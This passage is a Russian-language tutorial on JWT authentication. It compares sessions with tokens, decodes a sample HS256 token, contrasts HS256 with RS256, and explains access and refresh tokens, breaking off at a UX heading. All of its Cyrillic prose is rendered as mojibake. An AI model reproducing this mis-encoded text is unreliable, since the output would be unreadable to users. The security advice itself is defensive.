# JWT –¢–æ–∫–µ–Ω—ã: –†–∞–∑–±–æ—Ä –ø–æ–ª–µ—Ç–æ–≤

## JWT vs –°–µ—Å—Å–∏–∏: –ß—Ç–æ –≤—ã–±—Ä–∞—Ç—å?

### –ö–ª–∞—Å—Å–∏—á–µ—Å–∫–∏–π –ø–æ–¥—Ö–æ–¥: –°–µ—Å—Å–∏–∏

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**

1. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ª–æ–≥–∏–Ω–∏—Ç—Å—è
2. –°–µ—Ä–≤–µ—Ä —Å–æ–∑–¥–∞–µ—Ç **—Å–µ—Å—Å–∏—é** –≤ –ë–î/Redis
3. –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç `session_id` –≤ cookie
4. –ü—Ä–∏ –∫–∞–∂–¥–æ–º –∑–∞–ø—Ä–æ—Å–µ —Å–µ—Ä–≤–µ—Ä **–∏—â–µ—Ç —Å–µ—Å—Å–∏—é –≤ –ë–î** –ø–æ `session_id`
5. –ï—Å–ª–∏ –Ω–∞—à–µ–ª ‚Üí –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω

**–ü–ª—é—Å—ã:**

- ‚úÖ **–ü–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å**: —Å–µ—Ä–≤–µ—Ä –∑–Ω–∞–µ—Ç –í–°–ï –∞–∫—Ç–∏–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏
- ‚úÖ **–ú–≥–Ω–æ–≤–µ–Ω–Ω—ã–π –æ—Ç–∑—ã–≤**: —É–¥–∞–ª–∏–ª –∑–∞–ø–∏—Å—å –∏–∑ –ë–î ‚Üí –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ä–∞–∑–ª–æ–≥–∏–Ω–µ–Ω
- ‚úÖ **–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å**: –º–æ–∂–Ω–æ –≤—ã–∫–∏–Ω—É—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –ª—é–±–æ–π –º–æ–º–µ–Ω—Ç
- ‚úÖ **–ü—Ä–æ—Å—Ç–æ –ø–æ–Ω—è—Ç—å**: "–µ—Å—Ç—å –∑–∞–ø–∏—Å—å –≤ –ë–î = –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω"

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå **–ë–î –Ω–∞–≥—Ä—É–∑–∫–∞**: –∫–∞–∂–¥—ã–π –∑–∞–ø—Ä–æ—Å ‚Üí SELECT –≤ –ë–î
- ‚ùå **–ú–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞–Ω–∏–µ**: –Ω—É–∂–µ–Ω –æ–±—â–∏–π Redis –¥–ª—è –≤—Å–µ—Ö —Å–µ—Ä–≤–µ—Ä–æ–≤
- ‚ùå **Sticky sessions**: –∑–∞–ø—Ä–æ—Å –¥–æ–ª–∂–µ–Ω –ø–æ–ø–∞–¥–∞—Ç—å –Ω–∞ —Ç–æ—Ç –∂–µ —Å–µ—Ä–≤–µ—Ä

---

### –°–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–π –ø–æ–¥—Ö–æ–¥: JWT

**–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç:**

1. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ª–æ–≥–∏–Ω–∏—Ç—Å—è
2. –°–µ—Ä–≤–µ—Ä —Å–æ–∑–¥–∞–µ—Ç **JWT —Ç–æ–∫–µ–Ω** (–ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–π JSON)
3. –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ç–æ–∫–µ–Ω –∫–ª–∏–µ–Ω—Ç—É
4. –ü—Ä–∏ –∫–∞–∂–¥–æ–º –∑–∞–ø—Ä–æ—Å–µ —Å–µ—Ä–≤–µ—Ä **—Ç–æ–ª—å–∫–æ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –ø–æ–¥–ø–∏—Å—å** (–±–µ–∑ –ë–î!)
5. –ï—Å–ª–∏ –ø–æ–¥–ø–∏—Å—å –≤–∞–ª–∏–¥–Ω–∞ ‚Üí –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω

**–ü–ª—é—Å—ã:**

- ‚úÖ **Stateless**: —Å–µ—Ä–≤–µ—Ä –Ω–µ —Ö—Ä–∞–Ω–∏—Ç —Å–æ—Å—Ç–æ—è–Ω–∏–µ (–Ω–µ—Ç –ë–î –∑–∞–ø—Ä–æ—Å–æ–≤)
- ‚úÖ **–ú–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞–Ω–∏–µ**: –ª—é–±–æ–π —Å–µ—Ä–≤–µ—Ä –º–æ–∂–µ—Ç –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç–æ–∫–µ–Ω
- ‚úÖ **–ú–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å—ã**: —Ç–æ–∫–µ–Ω "–ø—É—Ç–µ—à–µ—Å—Ç–≤—É–µ—Ç" –º–µ–∂–¥—É —Å–µ—Ä–≤–∏—Å–∞–º–∏

**–ú–∏–Ω—É—Å—ã:**

- ‚ùå **–ù–ï–¢ –º–≥–Ω–æ–≤–µ–Ω–Ω–æ–≥–æ –æ—Ç–∑—ã–≤–∞**: —Ç–æ–∫–µ–Ω –≤–∞–ª–∏–¥–µ–Ω –¥–æ –∏—Å—Ç–µ—á–µ–Ω–∏—è `exp`
- ‚ùå **–°–ª–æ–∂–Ω–æ—Å—Ç—å –æ—Ç–∑—ã–≤–∞**: –Ω—É–∂–Ω—ã –∫–æ—Å—Ç—ã–ª–∏ (blacklist/whitelist)
- ‚ùå **–†–∞–∑–º–µ—Ä**: —Ç–æ–∫–µ–Ω –±–æ–ª—å—à–µ —á–µ–º `session_id` (–ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –≤ –∫–∞–∂–¥–æ–º –∑–∞–ø—Ä–æ—Å–µ)

---

### –ö–æ–≥–¥–∞ —á—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å?

**–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –°–µ—Å—Å–∏–∏ –µ—Å–ª–∏:**

- –ú–æ–Ω–æ–ª–∏—Ç–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ (–æ–¥–∏–Ω —Å–µ—Ä–≤–µ—Ä –∏–ª–∏ –ø–∞—Ä–∞ —Å–µ—Ä–≤–µ—Ä–æ–≤)
- –ù—É–∂–µ–Ω **–∂–µ—Å—Ç–∫–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å** (–±–∞–Ω–∫–∏, –ø–ª–∞—Ç–µ–∂–∏)
- –ö—Ä–∏—Ç–∏—á–Ω–∞ –º–≥–Ω–æ–≤–µ–Ω–Ω–∞—è –¥–µ–∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è (–∞–¥–º–∏–Ω–∫–∞, –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã)

**–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ JWT –µ—Å–ª–∏:**

- –ú–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å–Ω–∞—è –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ (10+ —Å–µ—Ä–≤–∏—Å–æ–≤)
- API –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π
- –ù—É–∂–Ω–æ –º–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞–Ω–∏–µ (—Ç—ã—Å—è—á–∏ –∑–∞–ø—Ä–æ—Å–æ–≤ –≤ —Å–µ–∫—É–Ω–¥—É)
- –†–∞–∑–¥–µ–ª–µ–Ω–∏–µ Auth Server –∏ Resource Server

**–í —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏:** –ß–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç **–≥–∏–±—Ä–∏–¥** (JWT –¥–ª—è Access, —Å–µ—Å—Å–∏–∏ –¥–ª—è Refresh)

---

## –ß—Ç–æ —Ç–∞–∫–æ–µ JWT?

**JWT (JSON Web Token)** ‚Äî —ç—Ç–æ —Å–ø–æ—Å–æ–± –±–µ–∑–æ–ø–∞—Å–Ω–æ–π –ø–µ—Ä–µ–¥–∞—á–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –º–µ–∂–¥—É —Å—Ç–æ—Ä–æ–Ω–∞–º–∏ –≤ –≤–∏–¥–µ JSON –æ–±—ä–µ–∫—Ç–∞. –¢–æ–∫–µ–Ω **–ø–æ–¥–ø–∏—Å–∞–Ω —Ü–∏—Ñ—Ä–æ–≤–æ–π –ø–æ–¥–ø–∏—Å—å—é**, –ø–æ—ç—Ç–æ–º—É –µ–≥–æ –º–æ–∂–Ω–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –∏ –¥–æ–≤–µ—Ä—è—Ç—å.

---

## –ê–Ω–∞—Ç–æ–º–∏—è –≤–∞—à–µ–≥–æ —Ç–æ–∫–µ–Ω–∞

–í–∞—à —Ç–æ–∫–µ–Ω:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzIiwiYXVkIjpbImZhc3RhcGktdXNlcnM6YXV0aCJdLCJleHAiOjE3NjM1NDM4NzR9.c7df-RcOUw2gKv9U8E3dnIcaC7tdRX_8NsF0vU8PRzc
```

### –°—Ç—Ä—É–∫—Ç—É—Ä–∞: –¢—Ä–∏ —á–∞—Å—Ç–∏ —á–µ—Ä–µ–∑ —Ç–æ—á–∫—É

```
HEADER.PAYLOAD.SIGNATURE
```

---

## –ß–∞—Å—Ç—å 1: Header (–ó–∞–≥–æ–ª–æ–≤–æ–∫)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

**–î–µ–∫–æ–¥–∏—Ä—É–µ–º** (—ç—Ç–æ –ø—Ä–æ—Å—Ç–æ Base64):

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**–ß—Ç–æ —ç—Ç–æ –∑–Ω–∞—á–∏—Ç:**

- `alg` (algorithm) ‚Äî –∞–ª–≥–æ—Ä–∏—Ç–º –ø–æ–¥–ø–∏—Å–∏: **HS256** (HMAC SHA-256)
- `typ` (type) ‚Äî —Ç–∏–ø —Ç–æ–∫–µ–Ω–∞: **JWT**

---

## –ß–∞—Å—Ç—å 2: Payload (–ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞)

```
eyJzdWIiOiIzIiwiYXVkIjpbImZhc3RhcGktdXNlcnM6YXV0aCJdLCJleHAiOjE3NjM1NDM4NzR9
```

**–î–µ–∫–æ–¥–∏—Ä—É–µ–º:**

```json
{
  "sub": "3",
  "aud": ["fastapi-users:auth"],
  "exp": 1763543874
}
```

**–ß—Ç–æ —ç—Ç–æ –∑–Ω–∞—á–∏—Ç:**

- `sub` (subject) ‚Äî **ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è** = `"3"`
- `aud` (audience) ‚Äî –¥–ª—è –∫–æ–≥–æ —Ç–æ–∫–µ–Ω: `["fastapi-users:auth"]`
- `exp` (expiration) ‚Äî —Å—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è: **1763543874** (Unix timestamp)

**–ü—Ä–æ–≤–µ—Ä–∏–º —Å—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è:**

```javascript
// –í –∫–æ–Ω—Å–æ–ª–∏ –±—Ä–∞—É–∑–µ—Ä–∞
new Date(1763543874 * 1000).toLocaleString()
// –†–µ–∑—É–ª—å—Ç–∞—Ç: "18.11.2025, 12:57:54" (–ø—Ä–∏–º–µ—Ä)
```

–¢–æ–∫–µ–Ω –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω –¥–æ —ç—Ç–æ–π –¥–∞—Ç—ã/–≤—Ä–µ–º–µ–Ω–∏.

---

## –ß–∞—Å—Ç—å 3: Signature (–ü–æ–¥–ø–∏—Å—å)

```
c7df-RcOUw2gKv9U8E3dnIcaC7tdRX_8NsF0vU8PRzc
```

**–ö–∞–∫ —Å–æ–∑–¥–∞–µ—Ç—Å—è:**

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  SECRET_KEY
)
```

–°–µ—Ä–≤–µ—Ä –±–µ—Ä–µ—Ç Header + Payload, —Å–∫–ª–µ–∏–≤–∞–µ—Ç –∏—Ö —á–µ—Ä–µ–∑ —Ç–æ—á–∫—É –∏ **–ø–æ–¥–ø–∏—Å—ã–≤–∞–µ—Ç —Å–µ–∫—Ä–µ—Ç–Ω—ã–º –∫–ª—é—á–æ–º**.

**–í–∞–∂–Ω–æ:** –ë–µ–∑ –∑–Ω–∞–Ω–∏—è `SECRET_KEY` –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å –≤–∞–ª–∏–¥–Ω—É—é –ø–æ–¥–ø–∏—Å—å!

---

## –î–µ–∫–æ–¥–∏—Ä—É–µ–º —Ç–æ–∫–µ–Ω –≤ –±—Ä–∞—É–∑–µ—Ä–µ

–û—Ç–∫—Ä–æ–π—Ç–µ –∫–æ–Ω—Å–æ–ª—å DevTools:

```javascript
// –í–∞—à —Ç–æ–∫–µ–Ω
const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzIiwiYXVkIjpbImZhc3RhcGktdXNlcnM6YXV0aCJdLCJleHAiOjE3NjM1NDM4NzR9.c7df-RcOUw2gKv9U8E3dnIcaC7tdRX_8NsF0vU8PRzc";

// –†–∞–∑–±–∏–≤–∞–µ–º –Ω–∞ —á–∞—Å—Ç–∏
const [header, payload, signature] = token.split('.');

// –î–µ–∫–æ–¥–∏—Ä—É–µ–º Header
JSON.parse(atob(header));
// {"alg":"HS256","typ":"JWT"}

// –î–µ–∫–æ–¥–∏—Ä—É–µ–º Payload
JSON.parse(atob(payload));
// {"sub":"3","aud":["fastapi-users:auth"],"exp":1763543874}

// Signature –Ω–µ–ª—å–∑—è –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞—Ç—å ‚Äî —ç—Ç–æ –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∞—è –ø–æ–¥–ø–∏—Å—å
```

**–ò–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –æ–Ω–ª–∞–π–Ω:** [jwt.io](https://jwt.io) (–≤—Å—Ç–∞–≤—å—Ç–µ —Ç–æ–∫–µ–Ω –∏ —É–≤–∏–¥–∏—Ç–µ –≤—Å–µ —á–∞—Å—Ç–∏)

---

## –ö–†–ò–¢–ò–ß–ï–°–ö–ò –í–ê–ñ–ù–û: –¢–æ–∫–µ–Ω ‚Äî —ç—Ç–æ –ù–ï —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ

### ‚ö†Ô∏è JWT ‚Äî —ç—Ç–æ –û–¢–ö–†–´–¢–´–ï –¥–∞–Ω–Ω—ã–µ

**–õ—é–±–æ–π —á–µ–ª–æ–≤–µ–∫** –º–æ–∂–µ—Ç –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞—Ç—å Header –∏ Payload:

- –ü—Ä–æ—Å—Ç–æ Base64 –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ
- –ù–∏–∫–∞–∫–æ–π –º–∞–≥–∏–∏, –Ω–∏–∫–∞–∫–æ–≥–æ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
- –í—Å–µ —á—Ç–æ –≤ `payload` ‚Äî **–≤–∏–¥–Ω–æ –≤—Å–µ–º**

### –ß—Ç–æ —ç—Ç–æ –∑–Ω–∞—á–∏—Ç?

**–ù–ò–ö–û–ì–î–ê –Ω–µ —Ö—Ä–∞–Ω–∏—Ç–µ –≤ JWT:**

- ‚ùå –ü–∞—Ä–æ–ª–∏
- ‚ùå –ù–æ–º–µ—Ä–∞ –∫—Ä–µ–¥–∏—Ç–Ω—ã—Ö –∫–∞—Ä—Ç
- ‚ùå –°–µ–∫—Ä–µ—Ç–Ω—ã–µ –∫–ª—é—á–∏ API
- ‚ùå –ü–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ (–∞–¥—Ä–µ—Å–∞, —Ç–µ–ª–µ—Ñ–æ–Ω—ã)

**–•—Ä–∞–Ω–∏—Ç–µ —Ç–æ–ª—å–∫–æ:**

- ‚úÖ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
- ‚úÖ –†–æ–ª–∏ (admin, user)
- ‚úÖ –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è
- ‚úÖ –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ

### –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å —á–µ—Ä–µ–∑ –ø–æ–¥–ø–∏—Å—å

**–ü–æ–¥–ø–∏—Å—å –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ—Ç:**

- –¢–æ–∫–µ–Ω **–Ω–µ –±—ã–ª –∏–∑–º–µ–Ω–µ–Ω** –ø–æ—Å–ª–µ —Å–æ–∑–¥–∞–Ω–∏—è
- –¢–æ–∫–µ–Ω **—Å–æ–∑–¥–∞–Ω –≤–∞—à–∏–º —Å–µ—Ä–≤–µ—Ä–æ–º** (—Ç–æ–ª—å–∫–æ —É –Ω–µ–≥–æ –µ—Å—Ç—å SECRET_KEY)

**–ù–æ –ù–ï –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ—Ç:**

- –ß—Ç–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ç–æ–∫–µ–Ω–∞ —Å–µ–∫—Ä–µ—Ç–Ω–æ

---

## –¢–∏–ø—ã –∞–ª–≥–æ—Ä–∏—Ç–º–æ–≤ –ø–æ–¥–ø–∏—Å–∏

### 1. –°–∏–º–º–µ—Ç—Ä–∏—á–Ω—ã–µ (Shared Secret)

**HS256 (HMAC SHA-256)** ‚Äî –≤–∞—à —Å–ª—É—á–∞–π

**–ü—Ä–∏–Ω—Ü–∏–ø:**

- –û–¥–∏–Ω —Å–µ–∫—Ä–µ—Ç–Ω—ã–π –∫–ª—é—á –¥–ª—è –ø–æ–¥–ø–∏—Å–∏ –ò –ø—Ä–æ–≤–µ—Ä–∫–∏
- –°–µ—Ä–≤–µ—Ä –∑–Ω–∞–µ—Ç `SECRET_KEY`
- –¢–æ–ª—å–∫–æ —Å–µ—Ä–≤–µ—Ä –º–æ–∂–µ—Ç —Å–æ–∑–¥–∞–≤–∞—Ç—å –∏ –ø—Ä–æ–≤–µ—Ä—è—Ç—å —Ç–æ–∫–µ–Ω—ã

**–ü–ª—é—Å—ã:**

- –ë—ã—Å—Ç—Ä–æ
- –ü—Ä–æ—Å—Ç–æ

**–ú–∏–Ω—É—Å—ã:**

- –ï—Å–ª–∏ –∫–ª—é—á —É—Ç–µ—á–µ—Ç ‚Üí –≤—Å–µ —Ç–æ–∫–µ–Ω—ã —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω—ã
- –ù–µ–ª—å–∑—è –¥–µ–ª–µ–≥–∏—Ä–æ–≤–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É —Ç—Ä–µ—Ç—å–∏–º –ª–∏—Ü–∞–º

---

### 2. –ê—Å–∏–º–º–µ—Ç—Ä–∏—á–Ω—ã–µ (Public/Private Key)

**RS256 (RSA SHA-256)**

**–ü—Ä–∏–Ω—Ü–∏–ø:**

- **–ü—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–ª—é—á** ‚Äî –ø–æ–¥–ø–∏—Å—ã–≤–∞–µ—Ç —Ç–æ–∫–µ–Ω—ã (—Ç–æ–ª—å–∫–æ —Å–µ—Ä–≤–µ—Ä –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏)
- **–ü—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á** ‚Äî –ø—Ä–æ–≤–µ—Ä—è–µ—Ç —Ç–æ–∫–µ–Ω—ã (–ª—é–±–æ–π –º–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å)

**–°—Ö–µ–º–∞:**

```
Auth Server (–∏–º–µ–µ—Ç –ø—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–ª—é—á)
  ‚Üì —Å–æ–∑–¥–∞–µ—Ç —Ç–æ–∫–µ–Ω
User
  ‚Üì –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ç–æ–∫–µ–Ω
Service A (–∏–º–µ–µ—Ç –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á) ‚Üí –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –ø–æ–¥–ø–∏—Å—å ‚úì
Service B (–∏–º–µ–µ—Ç –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á) ‚Üí –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –ø–æ–¥–ø–∏—Å—å ‚úì
Service C (–∏–º–µ–µ—Ç –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á) ‚Üí –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –ø–æ–¥–ø–∏—Å—å ‚úì
```

**–ü–ª—é—Å—ã:**

- –ú–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å—ã **–Ω–µ –∑–Ω–∞—é—Ç** –ø—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–ª—é—á
- –ï—Å–ª–∏ —Å–µ—Ä–≤–∏—Å –≤–∑–ª–æ–º–∞–ª–∏ ‚Üí –ø—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–ª—é—á –≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
- –ú–æ–∂–Ω–æ —Ä–∞–∑–¥–∞–≤–∞—Ç—å –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á –∫–æ–º—É —É–≥–æ–¥–Ω–æ

**–ú–∏–Ω—É—Å—ã:**

- –ú–µ–¥–ª–µ–Ω–Ω–µ–µ —á–µ–º HS256
- –°–ª–æ–∂–Ω–µ–µ –Ω–∞—Å—Ç—Ä–∞–∏–≤–∞—Ç—å

**–ö–æ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:**

- –ú–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å–Ω–∞—è –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞
- –†–∞–∑–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã —Ä–∞–∑—Ä–∞–±–∞—Ç—ã–≤–∞—é—Ç —Ä–∞–∑–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã
- –ù—É–∂–Ω–∞ –≤—ã—Å–æ–∫–∞—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å

---

## Access Token vs Refresh Token

### –ü—Ä–æ–±–ª–µ–º–∞ —Å –æ–¥–Ω–∏–º —Ç–æ–∫–µ–Ω–æ–º

**–í–∞—à —Ç–µ–∫—É—â–∏–π –ø–æ–¥—Ö–æ–¥:**

- –û–¥–∏–Ω —Ç–æ–∫–µ–Ω (`access_token`)
- –°—Ä–æ–∫ –∂–∏–∑–Ω–∏: –Ω–∞–ø—Ä–∏–º–µ—Ä, 1 —á–∞—Å
- –•—Ä–∞–Ω–∏—Ç—Å—è –≤ `localStorage`

**–†–∏—Å–∫–∏:**

- –ï—Å–ª–∏ —Ç–æ–∫–µ–Ω —É–∫—Ä–∞–ª–∏ (XSS –∞—Ç–∞–∫–∞) ‚Üí –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –∏–º–µ–µ—Ç –¥–æ—Å—Ç—É–ø 1 —á–∞—Å
- –ï—Å–ª–∏ —Å—Ä–æ–∫ –∏—Å—Ç–µ–∫ ‚Üí –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ–ª–∂–µ–Ω –ª–æ–≥–∏–Ω–∏—Ç—å—Å—è –∑–∞–Ω–æ–≤–æ (–ø–ª–æ—Ö–æ–π UX)

---

### –†–µ—à–µ–Ω–∏–µ: –î–≤–∞ —Ç–æ–∫–µ–Ω–∞

#### Access Token (–¢–æ–∫–µ–Ω –¥–æ—Å—Ç—É–ø–∞)

**–•–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏:**

- **–ö–æ—Ä–æ—Ç–∫–∏–π —Å—Ä–æ–∫ –∂–∏–∑–Ω–∏**: 15 –º–∏–Ω—É—Ç - 1 —á–∞—Å
- –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è **–∫–∞–∂–¥–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞** –∫ API
- –•—Ä–∞–Ω–∏—Ç—Å—è –≤ –ø–∞–º—è—Ç–∏ (state) –∏–ª–∏ `localStorage`

**–ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è:**

```typescript
fetch('/api/users/me', {
  headers: { 'Authorization': `Bearer ${accessToken}` }
})
```

---

#### Refresh Token (–¢–æ–∫–µ–Ω –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è)

**–•–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏:**

- **–î–æ–ª–≥–∏–π —Å—Ä–æ–∫ –∂–∏–∑–Ω–∏**: 7-30 –¥–Ω–µ–π
- –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è **—Ç–æ–ª—å–∫–æ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–æ–≤–æ–≥–æ Access Token**
- –•—Ä–∞–Ω–∏—Ç—Å—è –≤ **HttpOnly Cookie** (–±–µ–∑–æ–ø–∞—Å–Ω–µ–µ)

**–ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è:**

```typescript
// Access token –∏—Å—Ç–µ–∫ ‚Üí –ø–æ–ª—É—á–∞–µ–º –Ω–æ–≤—ã–π
const response = await fetch('/api/auth/refresh', {
  method: 'POST',
  credentials: 'include', // –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç cookie —Å refresh token
});

const { access_token } = await response.json();
// –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–≤—ã–π access token
```

---

### –°—Ö–µ–º–∞ —Ä–∞–±–æ—Ç—ã

```
1. –í—Ö–æ–¥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
   ‚Üì
–°–µ—Ä–≤–µ—Ä –≤—ã–¥–∞–µ—Ç:
   - Access Token (15 –º–∏–Ω)
   - Refresh Token (7 –¥–Ω–µ–π)
   ‚Üì
2. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ä–∞–±–æ—Ç–∞–µ—Ç
   ‚Üí –ö–∞–∂–¥—ã–π –∑–∞–ø—Ä–æ—Å —Å Access Token
   ‚Üì
3. Access Token –∏—Å—Ç–µ–∫ (—á–µ—Ä–µ–∑ 15 –º–∏–Ω)
   ‚Üí –ó–∞–ø—Ä–æ—Å –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç 401 Unauthorized
   ‚Üì
4. –§—Ä–æ–Ω—Ç–µ–Ω–¥ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏:
   ‚Üí –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç Refresh Token –Ω–∞ /auth/refresh
   ‚Üí –ü–æ–ª—É—á–∞–µ—Ç –Ω–æ–≤—ã–π Access Token
   ‚Üí –ü–æ–≤—Ç–æ—Ä—è–µ—Ç –∏—Å—Ö–æ–¥–Ω—ã–π –∑–∞–ø—Ä–æ—Å
   ‚Üì
5. Refresh Token –∏—Å—Ç–µ–∫ (—á–µ—Ä–µ–∑ 7 –¥–Ω–µ–π)
   ‚Üí –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–æ–ª–∂–µ–Ω –∑–∞–ª–æ–≥–∏–Ω–∏—Ç—å—Å—è –∑–∞–Ω–æ–≤–æ
```

---

### –ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞ –¥–≤—É—Ö —Ç–æ–∫–µ–Ω–æ–≤

**–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å:**

- Access Token –∂–∏–≤–µ—Ç 15 –º–∏–Ω—É—Ç ‚Üí –¥–∞–∂–µ –µ—Å–ª–∏ —É–∫—Ä–∞–ª–∏, —É—â–µ—Ä–± –º–∏–Ω–∏–º–∞–ª–µ–Ω
- Refresh Token –≤ HttpOnly Cookie ‚Üí JavaScript –Ω–µ –º–æ–∂–µ—Ç –ø—Ä–æ—á–∏—Ç–∞—Ç—å (–∑–∞—â–∏—Ç–∞ –æ—Ç XSS)

**UX (User Experience):**

